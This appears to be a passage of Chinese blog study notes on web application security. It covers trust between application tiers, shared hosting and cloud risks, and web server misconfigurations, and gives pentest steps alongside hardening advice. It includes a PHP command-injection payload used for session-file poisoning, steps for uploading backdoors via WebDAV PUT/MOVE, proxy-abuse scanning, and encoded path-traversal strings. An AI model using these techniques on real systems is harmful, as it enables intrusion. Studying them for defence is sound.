<h5 id="使用本地文件包含命令"><a href="#使用本地文件包含命令" class="headerlink" title="使用本地文件包含命令"></a>使用本地文件包含命令</h5><p>多数应用程序都会读取和访问一些本地文件，如果存在漏洞，意味着攻击者可以漏洞读取服务器上的任意文件内容，造成敏感信息泄露；如果应用程序存在文件写入漏洞的话，则攻击者可以利用该漏洞，向任意文件中写入其指定的内容（例如通过 URL 下载包含恶意命令的远程脚本，注入日志文件），并设置或等待条件触发其执行（例如包含并读取日志文件，触发提前注入的恶意命令的执行）；</p>
<p>示例：PHP 会将会话内容存在在某个以会话 id 命名的文件中</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085214.png" srcset="/img/loading.gif" lazyload></p>
<p>内容如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085239.png" srcset="/img/loading.gif" lazyload></p>
<p>因此攻击者可以通过设置自己的昵称，实现在会话文件中注入恶意命令的目的；例如将昵称设置为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(id);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后再利用应用程序已存在的文件包含漏洞，通过将参数设置为会话文件的路径，实现对该文件的调用</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210414085459.png" srcset="/img/loading.gif" lazyload></p>
<p> 渗透测试步骤：</p>
<ul>
<li>对于已知的应用程序漏洞，充分发挥想象力，思考如果利用漏洞和应用程序分层架构间的信任关系，扩大漏洞的影响范围；很多针对 Web 应用程序的成功攻击，都是从利用某个影响有限的漏洞出发，再利用信任关系，破坏应用程序的其余部分，最终实现严重的攻击；</li>
<li>如果能够在应用程序的某个组件中执行任意命令，并能够与其他主机建立网络连接，则应考虑向操作系统和网络层面中的基础架构发动直接攻击，扩大攻击范围；</li>
</ul>
<h3 id="保障分层架构的安全"><a href="#保障分层架构的安全" class="headerlink" title="保障分层架构的安全"></a>保障分层架构的安全</h3><h4 id="尽量减少信任关系"><a href="#尽量减少信任关系" class="headerlink" title="尽量减少信任关系"></a>尽量减少信任关系</h4><p>每一层尽量实施自己的权限控制，防止未授权的操作，同时不信任其他组件；示例如下：</p>
<ul>
<li>服务器层对特殊的资源和 URL 路径实施基于角色的访问控制；</li>
<li>数据库层为不同的用户提供不同的账户，根据角色设置不同的权限范围；这样可以减少 SQL 注入漏洞的影响范围；</li>
<li>应用程序组件只使用最低权限的操作系统账户执行，以降低命令注入和文件遍历漏洞的影响范围；</li>
</ul>
<h4 id="隔离不同组件"><a href="#隔离不同组件" class="headerlink" title="隔离不同组件"></a>隔离不同组件</h4><p>如有可能，尽量将每个层隔离开来，避免其无意间彼此交互</p>
<ul>
<li>一个层不得读取和写入其他层使用的文件；而是使用其他层提供的访问渠道进行数据访问；</li>
<li>对不同组件之间的网络访问进行过滤，仅允许需要实现功能的最少服务。例如数据库服务器仅开放数据库查询端口，其他端口不开放；避免攻击者利用内部网络对数据库的操作系统层进行攻击；</li>
</ul>
<blockquote>
<p>有了 Docker 容器技术后，貌似以上目标更好实现了一些；</p>
</blockquote>
<h4 id="局部深层防御"><a href="#局部深层防御" class="headerlink" title="局部深层防御"></a>局部深层防御</h4><p>对构成整个应用程序的各个单独组件内部，进行加强防御；</p>
<ul>
<li>对每台主机的各个层面进行安全强化，打上漏洞补丁，以减少攻击者利用漏洞进行扩散的可能性，让攻击的影响范围仅局限于单台机器；</li>
<li>对保存在应用程序层的数据进行加密，例如用户使用的密码、用户的敏感信息（如信用卡号等）；</li>
</ul>
<h2 id="共享主机与云服务供应商"><a href="#共享主机与云服务供应商" class="headerlink" title="共享主机与云服务供应商"></a>共享主机与云服务供应商</h2><p>很多中小型企业会将自己的应用程序托管在云服务供应商的共享主机上面，此时需要注意以下风险：</p>
<ul>
<li>云服务商的某个用户可能是攻击者，通过攻击云主机，实现对共享主机中其他组织的应用程序的攻击；</li>
<li>云服务商的某个用户可能在共享主机上部署了某个易受攻击的应用程序，导致共享主机被攻陷；</li>
</ul>
<h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>多个 Web 应用程序可能部署在同一台虚拟主机上，然后通过域名进行区分，当请求到达虚拟主机后，Nginx 或 Apache 服务器程序根据请求中的 Host 消息头区分请求的是哪一个应用程序，然后根据预先的配置，将请求转发给虚拟主机相应的应用程序；</p>
<h3 id="共享的应用程序服务"><a href="#共享的应用程序服务" class="headerlink" title="共享的应用程序服务"></a>共享的应用程序服务</h3><p>某个应用程序背后，可能是由分层的多个供应商的不同组成集成而来的；例如某个被大量中小企业共同需求的功能；举个栗子，在信用卡支付行业，市面上可能会存在三个层级的软件供应商：</p>
<ul>
<li>零售商：向中小企业销售软件，并根据企业的需求定制外层的功能和界面；</li>
<li>信用卡公司：根据零售商的需求，开发核心功能；</li>
<li>ASP 公司：根据多家信用卡公司的共同需求，开发核心应用程序，提供主机和部署，进行更新和支持；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415080752.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210415081853.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="攻击共享环境"><a href="#攻击共享环境" class="headerlink" title="攻击共享环境"></a>攻击共享环境</h3><h4 id="针对访问机制的攻击"><a href="#针对访问机制的攻击" class="headerlink" title="针对访问机制的攻击"></a>针对访问机制的攻击</h4><p>为了支持客户的个性化需求，ASP 一般通过上传（例如 FTP 或 SCP）或修改配置文件的功能来满足客户的定制需求，通常还会开放数据库端口，供客户查询保存的数据；</p>
<p>由于 ASP 供应商不可避免需要提供某种远程访问机制，因此存在一定的风险：</p>
<ul>
<li>有些远程访问机制如 FTP 未加密，使得攻击者有机会在中间进行拦截，获取用户的密码；</li>
<li>部分远程访问软件本身存在漏洞或者配置缺陷，攻击者利用漏洞可绕过访问控制机制，访问或破坏客户的应用程序和数据；</li>
<li>远程访问的隔离机制可能做得不好，例如客户之间的数据没有完全隔离，存在相互访问的可能性；或者原本只需要提供文件访问的场景，却提供了 shell，允许客户输入各种命令；</li>
<li>数据库的隔离可能不完善；</li>
<li>数据库的连接可能使用非加密的方式访问；</li>
<li>有时 ASP 为客户提供单独的访问程序，来实现对核心程序的访问；这些单独的访问程序本身可能也存在漏洞，攻击者一旦攻陷，就可以对所有客户的应用程序发起攻击；</li>
</ul>
<h4 id="应用程序间的攻击"><a href="#应用程序间的攻击" class="headerlink" title="应用程序间的攻击"></a>应用程序间的攻击</h4><p>在共享主机环境中，通常会允许用户向服务器合法上传可执行的脚本，导致存在应用程序间攻击的漏洞</p>
<h5 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h5><p>攻击者伪装成某个应用程序的客户（即恶意客户），然后通过合法机制，上传恶意脚本，执行对服务器或其他用户应用程序的攻击；</p>
<p>有些共享应用程序甚至允许客户编写部分自己的代码，这也为恶意客户提供了引入恶意代码的机会；</p>
<h5 id="应用程序本身漏洞"><a href="#应用程序本身漏洞" class="headerlink" title="应用程序本身漏洞"></a>应用程序本身漏洞</h5><p>如果应用程序本身存在漏洞，则攻击者可以利用该漏洞实现攻击：</p>
<ul>
<li>利用 SQL 注入漏洞，对数据库进行查询，如果没有隔离机制，则攻击者可以读取并修改所有应用程序的数据；</li>
<li>利用路径遍历漏洞，读取和写入任意文件；</li>
<li>利用命令注入漏洞，控制服务器和其他应用程序；</li>
</ul>
<h5 id="应用程序组件漏洞"><a href="#应用程序组件漏洞" class="headerlink" title="应用程序组件漏洞"></a>应用程序组件漏洞</h5><p>由于共享应用程序允许客户做一定程度的定制，这意味着客户的定制代码可能会引入一些漏洞，攻击者可以利用这些漏洞进行攻击；</p>
<p>通常来说，共享应用程序存在多个组件，并且它们之间需要交互，常见漏洞如下：</p>
<ul>
<li>不同客户的应用程序生成的数据通常会放在某个共享的文件目录下，然后 ASP 管理员有权限进行查看；这意味着为 XSS 攻击提供了方便之门，以自己的数据中注入脚本，当 ASP 管理员查看时，触发脚本的执行，获取管理权限或者管理功能；</li>
<li>ASP 通常使用一个共享数据库保存所有的客户数据，因此一般使用某个共享组件，执行数据库的存储和查询过程，因此组件之间存在信任关系漏洞，恶意客户可以利用该信任关系获取其他用户的数据；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>罗列共享应用程序为客户提供的访问机制<ul>
<li>访问机制是否使用安全协议，及安全的基础架构？</li>
<li>客户能否访问其原本不能访问的文件、数据或其他任意资源？</li>
<li>访问机制是否为客户提供 shell，接受客户的任意指令？</li>
</ul>
</li>
<li>是否为客户提供某种定制或配置共享环境的功能？该功能是否可以成为攻击目标？</li>
<li>如果应用程序支持命令、SQL 指令或任意文件，则值得仔细研究，寻找扩大攻击范围的可能性；</li>
<li>查找应用程序是否使用多个组件，如日志、管理、数据库等，检查这些组件是否存在漏洞；</li>
<li>检查应用程序所使用的数据库，使用开源工具如 NGSSquirrel 进行扫描，检查是否存在某些可利用的漏洞和缺陷；如有的话，再利用该漏洞扩大攻击范围；</li>
</ul>
<h4 id="攻击云"><a href="#攻击云" class="headerlink" title="攻击云"></a>攻击云</h4><p>越来越多的企业选择托管服务，这也意味着风险转移并聚集在了云服务商的身上，有部分安全问题已经是企业用户本身无法控制的；如果云服务商的托管服务出现漏洞，受影响的范围不再是某个应用程序或者某家企业，而是运行在托管环境中的成千上万的企业。</p>
<h5 id="系统拷贝"><a href="#系统拷贝" class="headerlink" title="系统拷贝"></a>系统拷贝</h5><p>许多应用程序会依赖操作系统来生成随机数字，云服务商通常使用某个公共的镜像来安装操作系统，因此如果攻击者获得镜像的拷贝，则可以获得用于生成随机数字的源，从而能够预测随机数字生成器的状态和生成的值；</p>
<h5 id="自助访问"><a href="#自助访问" class="headerlink" title="自助访问"></a>自助访问</h5><p>云服务商通常会提供某个管理云资源的自助页面，用户通过网页登录自助管理页面；如果登录过程存在访问控制漏洞，则攻击者有机会控制用户的云资源；</p>
<h5 id="永久访问令牌"><a href="#永久访问令牌" class="headerlink" title="永久访问令牌"></a>永久访问令牌</h5><p>用户需要管理云资源，为了避免频繁输入密码，用户一般会在本地保存某个令牌，用于登录验证；如果攻击者能够获取该令牌，则就能访问用户的云资源；</p>
<h5 id="Web-存储扩展"><a href="#Web-存储扩展" class="headerlink" title="Web 存储扩展"></a>Web 存储扩展</h5><p>云服务端提供的云存储功能是一个卖点，但它也意味着用户需要能够通过网页访问其存储的数据，因此云服务商在展示数据时，需要让数据支持某种浏览器扩展，而这些扩展可能存在漏洞；</p>
<h3 id="保障共享环境的安全"><a href="#保障共享环境的安全" class="headerlink" title="保障共享环境的安全"></a>保障共享环境的安全</h3><p>共享环境由于天然存在卧底和猪队友两种情形，因此需要特别留意访问控制、访问隔离和信任关系等问题；</p>
<h4 id="保障客户访问的安全"><a href="#保障客户访问的安全" class="headerlink" title="保障客户访问的安全"></a>保障客户访问的安全</h4><ul>
<li>访问机制需要使用严格的身份确认机制（目测阿里云和腾讯云都使用了双层验证机制，即增加了预留手机号的短信验证）；</li>
<li>仅给用户分配使用某个功能的最低权限；如果仅限于访问其私有目录；如果共享数据库，则确保其账户无法访问其他用户的数据；</li>
<li>如果使用某个定制的应用程序提供访问，则除了满足最严格的安全要求外，还需要对其进行测试；</li>
</ul>
<h4 id="隔离客户功能"><a href="#隔离客户功能" class="headerlink" title="隔离客户功能"></a>隔离客户功能</h4><p>由于存在恶意客户的可能性，因此需要隔离每个客户使用的功能，确保单个客户无法攻击其他客户，常见措施如下：</p>
<ul>
<li>为每个客户单独建立一个操作系统账号，并且该账号仅允许读取和写入为该客户分配的目录；</li>
<li>仅允许使用最低权限的少数操作系统命令；</li>
<li>为每个客户分配单独的数据库实例，仅向客户分配最低权限的账号，只允许访问私有的数据；</li>
</ul>
<blockquote>
<p>PHP 6 之前的版本使用安全模式来降低脚本权限，但是模式有漏洞，如果能够运行 php 命令，则可以尝试通过 phpinfo 命令获取版本信息；然后根据得到的信息，了解安全模式是否激活，以及上网搜索可利用的漏洞情况；</p>
</blockquote>
<h4 id="隔离共享应用程序中的组件"><a href="#隔离共享应用程序中的组件" class="headerlink" title="隔离共享应用程序中的组件"></a>隔离共享应用程序中的组件</h4><p>共享应用程序，例如 ASP 服务提供商提供的程序，通常使用大量的共享组件和客户定制组件。组件之间应减少信任关系，例如共享组件不可信任由客户定制组件发出的数据，并应对其进行严格的安全测试；</p>
<blockquote>
<p>应特别注意共享日志与管理功能；</p>
</blockquote>
<h2 id="小结-11"><a href="#小结-11" class="headerlink" title="小结"></a>小结</h2><p>如果共享环境的安全机制做得好的话，可以帮助应用程序的开发者提高安全性，但是它也不可避免引入了一些难以解决的新问题。因为整个共享环境的安全从某种程度来说依赖于某个薄弱应用程序的最短板。攻击者通过攻击某个存在漏洞的应用程序，或者直接部署一个恶意程序，然后利用它来攻击整个共享环境；</p>
<h1 id="18-攻击-Web-服务器"><a href="#18-攻击-Web-服务器" class="headerlink" title="18. 攻击 Web 服务器"></a>18. 攻击 Web 服务器</h1><p>绝大多数 Web 应用程序都基于某种技术栈进行开发，并运行于某个 Web 服务器程序的背后；这样做的好处是可以极大的提高开发效率，开发者只关注业务逻辑本身即可，同时将大量通用的功能交由技术栈中的组件进行处理；但这也意味着风险，因为如果这些技术栈本身存在漏洞的话，攻击者就可以利用漏洞向应用程序发起攻击；</p>
<h2 id="Web-服务器配置缺陷"><a href="#Web-服务器配置缺陷" class="headerlink" title="Web 服务器配置缺陷"></a>Web 服务器配置缺陷</h2><p>Web 服务器通常含有大量的默认配置项，但是这些默认配置项本身可能存在着风险，如果开发者没有对其进行修改和强化的话，攻击者就有可能利用这些漏洞；</p>
<h3 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h3><p>许多 Web 服务器程序包含管理接口，以便开发者访问并对服务器进行管理，有些接口位于某个默认的路径，有些则是运行在 8080 或者 8443 端口，并且使用默认密码</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210420085013.png" srcset="/img/loading.gif" lazyload></p>
<p>更有趣的是，除了服务器程序外，还有大量的设备使用禁止修改其默认密码的接口，例如交换机、打印机、无线AP 等；</p>
<blockquote>
<p>以下两个网址收集了各种使用默认密码的场景：</p>
<p><a target="_blank" rel="noopener" href="http://www.cirt.net/passwords">www.cirt.net/passwords</a></p>
<p><a target="_blank" rel="noopener" href="http://www.phenoelit-us.org/dpl/dpl.html">www.phenoelit-us.org/dpl/dpl.html</a></p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>在解析应用程序的环节，留心应用程序所使用的 Web 服务器程序和相关技术，以确认是否包含可访问的管理接口；</li>
<li>对 Web 服务器进行端口扫描，探查指向目标应用程序的所有管理接口；</li>
<li>找到接口后，查阅相关文档，了解这些接口所使用的默认密码；使用 Metasploit 的内置数据库扫描服务器；</li>
<li>如果默认密码无效，则尝试猜测有效的密码；</li>
<li>如果能够访问管理接口，则解析所有可用的功能， 看是否可以加以利用，进一步攻破主机和应用程序；</li>
</ul>
<h3 id="默认内容"><a href="#默认内容" class="headerlink" title="默认内容"></a>默认内容</h3><p>由于 Web 服务器程序是开源的，那么这同时意味着该程序有着丰富的文档内容和教程，可被攻击者利用，例如：</p>
<ul>
<li>方便开发者调试的功能；</li>
<li>用于演示某些常见任务的样本功能；</li>
<li>开发者忘了禁止公共访问的某些隐藏的强大功能；</li>
<li>文档</li>
</ul>
<h4 id="调试功能"><a href="#调试功能" class="headerlink" title="调试功能"></a>调试功能</h4><p>调试功能对攻击者非常有用，因为它会展示大量配置信息和应用程序的状态；例如调用 Apache 自带的 phpinfo 文件，就会返回 php 程序的相关信息，例如配置项、版本号、文件路径等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421073239.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="样本功能"><a href="#样本功能" class="headerlink" title="样本功能"></a>样本功能</h4><p>许多服务器程序会提供一些样本脚本，来演示如何调用服务器的相关功能。由于是基于演示的目的，为了让读者容易理解，这些脚本一般会特意编写的比较简单，但这也意味着攻击者可以利用里面可能存在的安全漏洞；</p>
<blockquote>
<p> 示例1：Jetty 7.0.0 版本的 Dump Servlet 可以通过 /test/jsp/dump.jsp 的 URL 访问，攻击者可以在 URL 标签中注入脚本代码；</p>
</blockquote>
<blockquote>
<p> 示例2：Tomcat 的 Session Example 脚本可用于修改会话变量，攻击者可以利用它来攻击用户的会话，查看会话中的敏感信息，并修改会话，让应用程序执行开发者预期外的行为；</p>
<p> <img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421074334.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<h4 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h4><p>许多服务器程序使用和应用程序本身相同的 HTTP 端口来进行部署，常常只要提供正确的密码，就可以访问这些功能；许多黑客的攻击方法简单粗暴，总结为三板斧：</p>
<ul>
<li>扫描端口+默认密码</li>
<li>上传恶意文件</li>
<li>执行恶意文件，获得 shell</li>
</ul>
<h4 id="管理功能-JMX"><a href="#管理功能-JMX" class="headerlink" title="管理功能 JMX"></a>管理功能 JMX</h4><p>JBoss 自带的 JMX 控制台提供了大量关于构建和部署程序的功能，因此里面也隐藏了很多安全漏洞；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210421081648.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>例如使用 DeploymentFileRepository 的 store 方法上传包含恶意代码的 WAR 文件；通过 Metasploit 等工具可以很方便高效的利用这类漏洞；</p>
</blockquote>
<h4 id="数据库网关-PL-SQL"><a href="#数据库网关-PL-SQL" class="headerlink" title="数据库网关 PL/SQL"></a>数据库网关 PL/SQL</h4><p>Oracle 服务器程序提供的 PL/SQL 网关产品，功能很强大，它提供了向数据库发送请求的接口，可以根据开发者提供的请求参数，转化成 SQL 请求发给数据库，简化开发者的工作；但是这也意味着攻击者可以利用它来实施数据库查询；虽然 Oracle 使用了白名单来作为补丁，但是仍然难以攻击者借道白名单之外的其他强大功能来实现攻击；</p>
<p>渗透测试步骤：</p>
<ul>
<li>可以使用 Nikto 等工具来确定应用程序自带的默认内容；</li>
<li>利用搜索引擎确定应用程序使用的技术栈和相关的默认内容；</li>
<li>在本地安装这些技术，从中查找潜在的默认功能漏洞，并进行调试；</li>
</ul>
<h3 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a>目录列表</h3><p>当请求的资源是某个目录的名称，而不是某个文件名称时，不同的应用程序可能会有不同的响应方式，常见的有3种：</p>
<ul>
<li>返回  403，表示请求被禁止；</li>
<li>返回一个默认文件，例如 index；</li>
<li>返回目录中的文件列表（有些程序用它来做内容导航）；</li>
</ul>
<p>返回文件列表有两个安全隐患：</p>
<ul>
<li>一些敏感文件不小心在列表中被泄露，例如日志文件、备份文件、旧的脚本文件等；</li>
<li>开发者可能忘了对文件实施正确的访问控制，因为预期攻击者不知道这些文件的路径；</li>
</ul>
<p>渗透测试步骤：</p>
<ul>
<li>向 Web 服务器上的每一个目录发送请求；</li>
<li>从响应中找出会返回目录列表的路径；</li>
</ul>
<blockquote>
<p>攻击者还可以通过已经发现的漏洞，让服务器返回文件列表；</p>
</blockquote>
<h3 id="HTTP-云存储"><a href="#HTTP-云存储" class="headerlink" title="HTTP 云存储"></a>HTTP 云存储</h3><p>由于云存储越来越普及，因此开发者需要提供一套基于 HTTP 协议的方法，让用户对分页式存储的文件进行访问和操作，WebDAV 就是一种常见的解决方案；</p>
<p>除了 GET 和 POST 外，WebDAV 通常还支持以下方法：PUT 上传文件、DELETE 删除文件、COPY 复制文件、MOVE 移动文件、SEARCH 搜索文件、PROPFIND 获取文件头信息；</p>
<blockquote>
<p>可以使用 OPTIONS 方法获取某个特定目录支持的所有 HTTP 方法；</p>
</blockquote>
<p>其中最危险的是 PUT 方法，因为它意味着攻击者可以上传恶意脚本；通常应用程序会对目录访问实施一定的权限控制，因此需要在测试过程中进行递归检查，找到被开发者漏洞的目录；</p>
<blockquote>
<p>除了权限控制外，WebDAV 一般会基于某些脚本文件后缀名来限制用户上传的文件类型，从而避免引入恶意代码；但是 HTML 和 JAR 文件一般被允许，这意味着攻击者利用这两种类型的文件即可实现攻击；</p>
</blockquote>
<p>渗透测试步骤：</p>
<ul>
<li>使用第三方工具，例如 Burp Repeater 发送请求；</li>
<li>使用 OPTIONS 方法列出服务器支持的 HTTP 方法；不可完全相信 OPTIONS 请求的结果，因为实际上支持的方法取决于应用程序，而不是服务器程序；因此需要对所有可用和不可用的方法，都进行测试；</li>
<li>发现可用的方法后，先尝试上传良性文件，再尝试上传后门脚本；</li>
<li>如果发现脚本后缀被限制，则可以改成 txt 后上传；待上传成功后，再使用 MOVE 命令改成正确的后缀名；</li>
<li>如果以上方法都不行，则尝试上传 HTML 和 JAR 文件；</li>
<li>使用 davtest.pl 之类的工具自动遍历所有目录；</li>
</ul>
<h3 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h3><p>如果 Web 服务器不直接对外提供服务，而是仅作为代理服务器，那么可能存在以下攻击面：</p>
<ul>
<li>访问未在公网上暴露的内部网络；</li>
<li>转发恶意请求，隐藏攻击者的身份；</li>
<li>访问代理服务器上运行的其他服务，利用信任关系避开防火墙的限制；</li>
</ul>
<p>如果 Web 服务器负责转发请求，当给它发一个完整 URL 的 GET 请求时，请求将会被转发到目标主机；但也有一些服务器没有转发，而是从自己的根目录中返回被请求的资源；</p>
<p>尝试使用 CONNECT 方法连接目标主机和端口号，如果服务器做出正确的响应，则说明它在代理到目标主机的连接；当连接建立以后，就可以尝试攻击非 HTTP 服务；但是，大多数服务器对可用端口做出严格的限制，一般只能访问 443 端口，无法访问其他端口；但是也说不定，有些开发者可能没有仔细配置，导致其他端口也暴露了；</p>
<p>渗透测试步骤：</p>
<ul>
<li>使用 GET 和 CONNECT 请求，尝试用 Web 服务器作为代理服务器，连接因特网上的其他服务器，核对返回的响应内容；</li>
<li>当使用 CONNECT 建立连接后，尝试在请求中的 HOST 字段中指定不同的 IP 地址和端口号，扫描其本地可用服务；并在请求中指定 127.0.0.1 作为目标主机，连接 Web 服务器上的可用端口号；</li>
</ul>
<h3 id="虚拟主机配置缺陷"><a href="#虚拟主机配置缺陷" class="headerlink" title="虚拟主机配置缺陷"></a>虚拟主机配置缺陷</h3><p>当 Apache 代理多个站点时，一般配置文件的内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *&gt;</span><br>	ServerName eis<br>    DocumentRoot /var/www2<br><span class="hljs-tag">&lt;/<span class="hljs-name">VirtualHost</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这个配置文件的问题在于，它仅说明了特定 Web 站点的配置选项，却忘了 Web 服务器本身是有默认站点值的，该默认站点的值并未进行配置或修改，因此攻击者可以通过访问默认的虚拟站点进行攻击；</p>
<p>渗透测试步骤：</p>
<ul>
<li>使用以下方式向根目录提交 GET 请求<ul>
<li>正确的 Host 消息头；</li>
<li>随意的 Host 消息头；</li>
<li>Host 消息头中的服务器 IP  地址；</li>
<li>无 Host 消息头；</li>
</ul>
</li>
<li>进行以上请求的响应内容；一般来说，在 Host 消息头中指定 IP 地址可获得目录列表，以及各种默认的内容；</li>
<li>如果观察到不同的行为，使用造成异常行为的 Host 消息头重复解析过程，并使用 Nikto 等工具的 -vhost 选项进行扫描，尝试找到任何的默认内容；</li>
</ul>
<h3 id="保障-Web-服务器配置的安全"><a href="#保障-Web-服务器配置的安全" class="headerlink" title="保障 Web 服务器配置的安全"></a>保障 Web 服务器配置的安全</h3><p>疏忽大意和没有安全意识，是造成 Web 服务器漏洞的主要原因，因此在使用某个 Web 服务器软件之前，有必要对其文档进行深入的学习，以及相关的安全强化指南等教程；</p>
<p>常见配置问题如下：</p>
<ul>
<li>修改任何默认的密码，删除任何不必要的账户；</li>
<li>对非标准端口设置防火墙，禁止公众访问；</li>
<li>对 Web 根目录所指向的路径实施访问控制；</li>
<li>删除与应用程序无关的不必要的默认内容和功能（可使用 Nikto 工具进行重复检查）；</li>
<li>如果部分默认功能需要保留，则应相应的进行安全强化，禁止不必要的选项和行为；</li>
<li>如果可能，关掉整个 Web 服务器的目录列表功能；确保每个可访问目录包含服务器默认提供的 index.html 文件；</li>
<li>除应用程序必须的方法外，禁用所有其他方法；</li>
<li>确保没有将 Web 服务器配置为代理服务器；如果一定要开启代理功能，则应只允许它连接特定主机和端口；并添加网络层的过滤，控制服务器向外发送的请求；</li>
<li>如果 Web 服务器支持虚拟主机，则应同时确保主机上完成了 Web 服务器需要的相关配置，以确保 Web 服务器的安全强化措施确实得以实现；</li>
</ul>
<h2 id="易受攻击的服务器软件"><a href="#易受攻击的服务器软件" class="headerlink" title="易受攻击的服务器软件"></a>易受攻击的服务器软件</h2><p>由于攻守双方的博弈，随着时间推移，主流 Web 服务器平台变得日渐可靠，但由于 Web 服务器软件仍然在不断发展，因此新的漏洞仍然在不断产生，大多数新漏洞存在于以下软件中：</p>
<ul>
<li>IIS 和 Apache 的服务端扩展；</li>
<li>从头新开发的 Web 服务器（由于产品很新，之前较少受到黑客关注，因此容易隐藏未发现的漏洞）；</li>
</ul>
<h3 id="应用程序框架缺陷"><a href="#应用程序框架缺陷" class="headerlink" title="应用程序框架缺陷"></a>应用程序框架缺陷</h3><p>多年来，Web 应用程序框架一直存在着各式各样的缺陷，示例如下：.NET 填充提示漏洞</p>
<p>.NET 加密过程：</p>
<ol>
<li>选择一段明文信息；</li>
<li>计算信息长度，得到应填充的字符数量；</li>
<li>填充相应的字符数到消息中</li>
<li>对填充后的明文信息分成相等大小的多个小组</li>
<li>将第一个小组与初始向量（某个初始值）进行 XOR 运算（初始向量或许也可以看做是第 0 个分组）；</li>
<li>对第一个小组的 XOR 运算结果进行 3DES 加密，得到第一个小组的加密值；</li>
<li>选择第二个小组，与上一个小组的加密值进行 XOR 运算；</li>
<li>对第二个小组的 XOR 运算结果进行 3DES 加密，得到第二个小组的加密值；</li>
<li>选择第三个小组，重复第 7 和第 8 两个步骤；</li>
</ol>
<p>上面这个加密过程本身并没有什么漏洞，但好死不死的是曾经的 .NET 版本还有另外一个看似无害的信息泄露漏洞，即如果 .NET 在请求参数中发现加密填充错误，则应用程序会返回 HTTP 500 状态码。因此，攻击者可以利用这个信息泄露漏洞，逐位的进行试错，破解初始向量 IV；之后攻击者除了可以利用 IV 解密信息外，还可以利用它来加密信息，并利用框架对该加密值的信任关系，执行恶意指令；</p>
<blockquote>
<p>教训：两个或者多个看似无害的漏洞，组合起来可能变得非常的有害；</p>
</blockquote>
<h3 id="内存管理漏洞"><a href="#内存管理漏洞" class="headerlink" title="内存管理漏洞"></a>内存管理漏洞</h3><p>考虑到性能，多数服务器程序是使用编译型语言编写的，这也意味着它们很可能存在缓冲区溢出漏洞；</p>
<ul>
<li>Apache mod_isapi 悬挂指针：2010 年版本的 Apache 在遇到错误时，系统将从内存中强制卸载 mod_isapi，但是函数指针仍然保留在内存中，这意味着攻击者可以调用该指针，访问其指向的内容；</li>
<li>Microsoft IIS  ISAPI 扩展：2001 年该漏洞使得攻击者可以在 Local System 权限下执行任意代码；2008 年该扩展被发现了另外一个漏洞；</li>
<li>Apache 分块编码溢出：2002年，被发现存在整数符号错误造成的漏洞；2010年，被发现 mod_proxy 在处理 HTTP 响应的分块编码时，存在整数溢出；</li>
<li>WebDAV 溢出；</li>
</ul>
<h3 id="编码与规范化漏洞"><a href="#编码与规范化漏洞" class="headerlink" title="编码与规范化漏洞"></a>编码与规范化漏洞</h3><p>一个请求到达服务器后，可能会被很多层的组件进行处理，例如服务器程序、应用程序业务逻辑、第三方库、操作系统等；这些组件可存在使用不同的编码处理方式，导致攻击者有机会利用这种差异避开过滤或者造成程序的异常行为；</p>
<ul>
<li>Apple iDisk Server 路径遍历漏洞：攻击者可以将路径遍历指令编码到请求参数中；</li>
<li>Ruby WEBrick Web 服务器遍历漏洞：详见 <a target="_blank" rel="noopener" href="http://www.securityfocus.com/bid/28123">http://www.securityfocus.com/bid/28123</a></li>
<li>Java Web 服务器目录遍历：JVM 不对 UTF-8 进行解码，因此攻击者通过 UTF-8 编码的 ../ 可实现路径编码，详见：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/security-6.html">https://tomcat.apache.org/security-6.html</a></li>
<li>Allaire JRun 目录列表漏洞：JRun 会将 url 中以 jsp 结尾的请求，转发给负责 JSP 文件的组件处理，而该组件会对文件名进行 URL 解码，如果文件名是一个问号，则会当作查询关键字，查询目录内容并返回；详见 <a target="_blank" rel="noopener" href="https://www.securityfocus.com/bid/3592">https://www.securityfocus.com/bid/3592</a></li>
<li>Jetty 也存在类似上例的漏洞，详见：<a target="_blank" rel="noopener" href="https://www.kb.cert.org/vuls/id/402580">https://www.kb.cert.org/vuls/id/402580</a></li>
<li>Microsoft IIS Unicode 路径遍历漏洞：攻击者通过提交 ../ 的各种非常 Unicode 编码形式来避开过滤；虽然 IIS 本身对路径遍历实施过滤，但是难以全面覆盖各种非法的形式；</li>
<li>WebDAV 也存在类似上例的漏洞，攻击者通过在请求路径中插入 %c0%af，实现对受 ISS 保护文件的下载；</li>
